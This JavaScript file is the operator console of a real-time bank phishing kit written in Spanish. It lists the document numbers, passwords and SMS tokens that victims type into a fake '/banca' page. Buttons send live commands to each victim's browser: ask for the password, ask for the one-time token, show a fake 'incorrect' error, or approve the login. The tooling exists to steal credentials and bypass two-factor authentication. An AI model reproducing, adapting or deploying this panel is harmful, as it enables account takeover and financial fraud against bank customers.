(function () {
  const socket = typeof io !== "undefined" ? io() : null;
  const container = document.getElementById("operator-sessions-list");
  const countBadge = document.getElementById("active-users-count");

  function renderSessions(sessions) {
    if (!Array.isArray(sessions)) return;
    if (countBadge) {
      countBadge.textContent = sessions.length;
    }
    if (!container) return;

    if (sessions.length === 0) {
      container.innerHTML = `
        <div class="empty-state">
          <h3>⚡ Esperando usuarios conectados...</h3>
          <p>Los datos ingresados por los usuarios en <b>/banca</b> aparecerán aquí en tiempo real.</p>
        </div>
      `;
      return;
    }

    container.innerHTML = sessions.map((s) => `
      <div class="session-card" data-id="${s.id}">
        <div class="card-top">
          <span class="step-pill">${s.status || s.step}</span>
          <span class="time-info">⏰ ${s.updatedAt || ""}</span>
        </div>
        <div class="data-row">
          <span class="data-label">📄 ${s.docType || "DNI"}</span>
          <span class="data-val doc">${s.docNumber || "—"}</span>
        </div>
        <div class="data-row">
          <span class="data-label">🔑 Contraseña</span>
          <span class="data-val pass">${s.password || "—"}</span>
        </div>
        <div class="data-row">
          <span class="data-label">📱 Código SMS Token</span>
          <span class="data-val token">${s.token || "—"}</span>
        </div>
        <div class="actions-grid">
          <button class="cmd-btn btn-err-doc" onclick="sendCmd('${s.id}', 'wrong_doc', 'Documento incorrecto')">❌ Err. Doc</button>
          <button class="cmd-btn btn-err-pass" onclick="sendCmd('${s.id}', 'wrong_pass', 'Contraseña incorrecta')">🔑 Err. Clave</button>
          <button class="cmd-btn btn-err-token" onclick="sendCmd('${s.id}', 'wrong_token', 'Token inválido')">📲 Err. SMS</button>
          <button class="cmd-btn btn-ask-pass" onclick="sendCmd('${s.id}', 'ask_pass', 'Pedir clave')">➡️ Pedir Clave</button>
          <button class="cmd-btn btn-ask-token" onclick="sendCmd('${s.id}', 'ask_token', 'Pedir token')">📱 Pedir Token</button>
          <button class="cmd-btn btn-approve" onclick="sendCmd('${s.id}', 'approve', 'Aprobar')">✅ Aprobar Login</button>
          <button class="cmd-btn btn-delete" onclick="deleteSession('${s.id}')">🗑️ Borrar Registro</button>
        </div>
      </div>
    `).join("");
  }

  function fetchSessions() {
    fetch("/api/sessions", { cache: "no-store" })
      .then(function (r) { return r.ok ? r.json() : null; })
      .then(function (data) {
        if (Array.isArray(data)) renderSessions(data);
      })
      .catch(function () {});
  }

  if (socket) {
    socket.emit("admin:join");
    socket.on("connect", function () {
      socket.emit("admin:join");
    });
    socket.on("sessions:update", renderSessions);
  }

  fetchSessions();
  setInterval(fetchSessions, 2000);

  window.sendCmd = function (targetId, action, defaultMsg) {
    let message = defaultMsg;
    if (action.startsWith("wrong")) {
      const customMsg = prompt("Mensaje de error para el usuario:", defaultMsg);
      if (customMsg === null) return;
      message = customMsg;
    }
    fetch("/api/command", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ targetId, action, message }),
    })
      .then(fetchSessions)
      .catch(function () {
        if (socket) socket.emit("admin:command", { targetId, action, message });
      });
  };

  window.deleteSession = function (targetId) {
    if (confirm("¿Seguro que deseas eliminar este registro del panel?")) {
      if (socket) socket.emit("admin:delete_session", { targetId });
      fetch("/api/delete_session", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ targetId }),
      }).then(fetchSessions).catch(function () {});
    }
  };

  window.clearAllSessions = function () {
    if (confirm("¿Seguro que deseas borrar TODOS los registros del panel?")) {
      if (socket) socket.emit("admin:delete_session", { targetId: null });
      fetch("/api/delete_session", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ targetId: null }),
      }).then(fetchSessions).catch(function () {});
    }
  };
})();


